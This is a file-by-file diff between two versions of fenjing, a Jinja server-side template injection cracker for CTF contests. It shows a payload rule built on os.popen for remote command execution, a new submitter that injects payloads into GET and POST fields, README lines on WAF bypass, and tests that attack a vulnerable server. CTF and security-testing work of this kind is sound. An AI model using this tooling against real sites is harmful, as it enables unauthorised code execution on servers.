 def gen_os_popen_read_normal2(context, cmd):
     return [
         (LITERAL, "("),
         (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
         (LITERAL, "("),
         (INTEGER, -1),
         (LITERAL, "))"),
 
     ]
 
 @req_gen
 def gen_os_popen_read_eval(context, cmd):
     return [
-        (EVAL, "__import__('os').popen('{}').read()".format(cmd.replace("'", "\\'"))),
+        (EVAL, (STRING, "__import__('os').popen('{}').read()".format(cmd.replace("'", "\\'")))),
     ]
 
 
 if __name__ == "__main__":
     import time
     import functools
```

### Comparing `fenjing-0.4.9.1/fenjing/requester.py` & `fenjing-0.5.0/fenjing/requester.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.9.1/fenjing/scan_url.py` & `fenjing-0.5.0/fenjing/scan_url.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.9.1/fenjing/shell_payload.py` & `fenjing-0.5.0/fenjing/shell_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.9.1/fenjing/submitter.py` & `fenjing-0.5.0/fenjing/submitter.py`

 * *Files 20% similar despite different names*

```diff
@@ -1,11 +1,12 @@
 from typing import List, Callable, Union, NamedTuple, Dict
 from urllib.parse import quote
 import logging
 import subprocess
+import html
 
 from .form import Form, fill_form
 from .requester import Requester
 from .colorize import colored
 from .const import CALLBACK_SUBMIT
 
 logger = logging.getLogger("submitter")
@@ -19,14 +20,15 @@
         proc = subprocess.Popen(
             shell_cmd,
             shell=True,
             stdout=subprocess.PIPE,
             stdin=subprocess.PIPE,
             stderr=subprocess.PIPE,
         )
+        assert proc.stdin and proc.stdout
         proc.stdin.write(payload.encode())
         proc.stdin.close()
         ret = proc.wait()
         if ret != 0:
             raise ValueError(
                 f"Shell command return non-zero code {ret} for input {payload}"
             )
@@ -67,15 +69,59 @@
 
     def submit(self, payload: str) -> Union[HTTPResponse, None]:
         if self.tamperers:
             logger.debug("Applying tampers...")
             for tamperer in self.tamperers:
                 payload = tamperer(payload)
         logger.debug("Submit %s", colored("blue", payload))
-        return self.submit_raw(payload)
+        resp = self.submit_raw(payload)
+        if resp is None:
+            return None
+        return HTTPResponse(resp.status_code, html.unescape(resp.text))
+
+
+class RequestSubmitter(BaseSubmitter):
+    """向一个url提交GET或POST数据"""
+
+    def __init__(
+        self,
+        url: str,
+        method: str,
+        target_field: str,
+        params: Union[Dict[str, str], None],
+        data: Union[Dict[str, str], None],
+        requester: Requester,
+    ):
+        """传入目标的URL, method和提交的项
+
+        Args:
+            url (str): 目标URL
+            method (str): 方法
+            target_field (str): 目标项
+            params (Union[Dict[str, str], None]): 目标GET参数
+            data (Union[Dict[str, str], None]): 目标POST参数
+        """
+        super().__init__()
+        self.url = url
+        self.method = method
+        self.target_field = target_field
+        self.params = params if params else {}
+        self.data = data if data else {}
+        self.req = requester
+
+    def submit_raw(self, raw_payload):
+        params, data = self.params.copy(), self.data.copy()
+        if self.method == "POST":
+            data.update({self.target_field: raw_payload})
+        else:
+            params.update({self.target_field: raw_payload})
+        logger.info("Submit %s", colored("blue", f"{params=} {data=}"))
+        return self.req.request(
+            method=self.method, url=self.url, params=params, data=data
+        )
 
 
 class FormSubmitter(BaseSubmitter):
     """
     向一个表格的某一项提交payload, 其他项随机填充
     """
 
@@ -141,17 +187,15 @@
     def submit_raw(self, raw_payload: str) -> Union[HTTPResponse, None]:
         if any(w in raw_payload for w in ["/", ".."]):
             logger.info(
                 "Don't submit %s because it can't be in the path.",
                 colored("yellow", repr(raw_payload)),
             )
             return None
-        resp = self.req.request(
-            method="GET", url=self.url + quote(raw_payload)
-        )
+        resp = self.req.request(method="GET", url=self.url + quote(raw_payload))
         self.callback(
             CALLBACK_SUBMIT,
             {
                 "type": "path",
                 "url": self.url,
                 "payload": raw_payload,
                 "response": resp,
```

### Comparing `fenjing-0.4.9.1/fenjing/templates/index.html` & `fenjing-0.5.0/fenjing/templates/index.html`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.9.1/fenjing/waf_func_gen.py` & `fenjing-0.5.0/fenjing/waf_func_gen.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.9.1/fenjing/webui.py` & `fenjing-0.5.0/fenjing/webui.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.9.1/fenjing.egg-info/PKG-INFO` & `fenjing-0.5.0/fenjing.egg-info/PKG-INFO`

 * *Files 3% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.4.9.1
+Version: 0.5.0
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.7
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -25,14 +25,15 @@
 
 - 集成了大部分CTF中的SSTI WAF绕过技巧
 - 全自动扫描HTML页面中的form元素并进行攻击
 - 全自动分析网站的WAF并生成相应的payload
 - 使用精确模式全面分析网站或使用快速模式减少不必要的网络请求
 - 支持攻击对应的HTML表单或HTML路径
 - 使用Shell指令对要发送的payload进行编码
+- \[试验性功能\]使用`--eval-args-payload`将payload放进GET参数中提交，有效降低payload长度
 - 方便的网页界面/命令行界面
 
 ## 快速上手
 
 在以下方法中选择一种
 
 ### 使用pip安装运行
@@ -148,15 +149,15 @@
   - 攻击某个路径（如`http://xxx.xxx/hello/<payload>`）存在的漏洞
   - 参数大致上和crack相同，但是只需要提供对应的路径
   - 示例：`python -m fenjing crack-path --url 'http://xxx/hello/'`
 - get-config: 对某个特定的表单进行攻击，但是只获取flask config
   - 参数大致上和crack相同
 
 一些特殊的选项：
-
+- `--eval-args-payload`：试验性选项，将payload放在GET参数x中提交
 - `--detect-mode`：检测模式，可为accurate或fast
   - 默认为accurate
   - 在开始尝试触发WAF, 获取WAF页面对应hash时：
     - accurate模式会一个接一个地发送尽可能多的payload
     - fast模式会将多个payload组合在一起发送，
   - 在生成payload时：
     - accurate模式会先从最简单的方法试起
```

### Comparing `fenjing-0.4.9.1/fenjing.egg-info/SOURCES.txt` & `fenjing-0.5.0/fenjing.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.9.1/setup.py` & `fenjing-0.5.0/setup.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.9.1/tests/test_cracker.py` & `fenjing-0.5.0/tests/test_cracker.py`

 * *Files 19% similar despite different names*

```diff
@@ -1,58 +1,50 @@
 # pylint: skip-file
 # flake8: noqa
 
 import sys
 
 sys.path.append("..")
-
+from fenjing.form import get_form
+from fenjing.requester import Requester
 import unittest
 import fenjing
 from typing import Union
 from fenjing.cracker import Cracker
-from fenjing.submitter import BaseSubmitter, HTTPResponse
+from fenjing.submitter import FormSubmitter, HTTPResponse
 from fenjing import const
-import jinja2
 import logging
+import os
 
-
-class FakeSubmitter(BaseSubmitter):
-    def __init__(self, waf, callback=None):
-        super().__init__(callback)
-        self.waf = waf
-
-    def submit_raw(self, raw_payload: str) -> Union[HTTPResponse, None]:
-        if not self.waf(raw_payload):
-            return HTTPResponse(200, "Nope")
-        try:
-            result = jinja2.Template(source=raw_payload).render()
-            return HTTPResponse(200, result)
-        except Exception:
-            return HTTPResponse(500, "Internal Server Error")
+VULUNSERVER_ADDR = os.environ["VULUNSERVER_ADDR"]
 
 
 class CrackerTestBase(unittest.TestCase):
     def setUp(self):
         super().setUp()
         self.blacklist = ["."]
-        self.subm = FakeSubmitter(
-            lambda x: all(w not in x for w in self.blacklist)
+        self.subm = FormSubmitter(
+            url=VULUNSERVER_ADDR,
+            form=get_form(action="/", inputs=["name"], method="GET"),
+            target_field="name",
+            requester=Requester(interval=0.01),
         )
 
     def test_waf(self):
         cracker = Cracker(self.subm)
         full_payload_gen = cracker.crack()
         self.assertIsNotNone(full_payload_gen)
         payload, _ = full_payload_gen.generate(
             const.OS_POPEN_READ,
-            "echo 'cracked! @m wr!tIng s()th' " + self.__class__.__name__,
+            "echo 'cracked! @m wr!tI1111ng s()th' " + self.__class__.__name__,
         )
         self.assertIsNotNone(payload)
         resp = self.subm.submit(payload)
-        self.assertIn("cracked! @m wr!tIng s()th", resp.text)
+        assert resp is not None
+        self.assertIn("cracked! @m wr!tI1111ng s()th", resp.text)
 
 
 class CrackerTestHard(CrackerTestBase):
     def setUp(self):
         super().setUp()
         self.blacklist = [
             "config",
@@ -75,17 +67,14 @@
             "'",
             "_",
             ".",
             "+",
             "~",
             "{{",
         ]
-        self.subm = FakeSubmitter(
-            lambda x: all(w not in x for w in self.blacklist)
-        )
 
 
 class CrackerTestWeird(CrackerTestBase):
     def setUp(self):
         super().setUp()
         self.blacklist = [
             "[",
@@ -93,11 +82,8 @@
             "'",
             "_",
             ".",
             "+",
             "~",
             "{{",
         ]
-        self.subm = FakeSubmitter(
-            lambda s: any(w in s for w in "facklimama")
-            or all(w not in s for w in self.blacklist)
-        )
+
```

### Comparing `fenjing-0.4.9.1/tests/test_payload_gen.py` & `fenjing-0.5.0/tests/test_payload_gen.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,13 +1,16 @@
 import sys  # noqa
 
 sys.path.append("..")  # noqa
 
 import unittest
 import fenjing
+from flask import render_template_string
+
+
 from fenjing.payload_gen import PayloadGenerator
 from fenjing import const
 import logging
 
 fenjing.payload_gen.logger.setLevel(logging.ERROR)
 logging.basicConfig(level=logging.INFO)
```

